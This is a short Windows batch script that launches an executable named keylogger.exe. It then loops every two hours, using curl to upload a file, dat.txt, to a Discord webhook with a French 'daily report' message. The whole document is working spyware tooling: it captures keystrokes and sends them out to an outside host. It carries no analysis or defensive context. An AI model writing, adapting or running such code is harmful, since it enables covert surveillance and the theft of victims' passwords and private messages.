@echo off
start keylogger.exe
:loop
setlocal enabledelayedexpansion
set "message_text=**Voici le rapport quotidien envoyé à :** !time!"
set "attachment=dat.txt"
curl -k -F "payload_json={\"content\": \"%message_text%\"}" -F "file1=@%attachment%" %discordwebhookurl%
endlocal

timeout /t 7200 >nul
goto loop
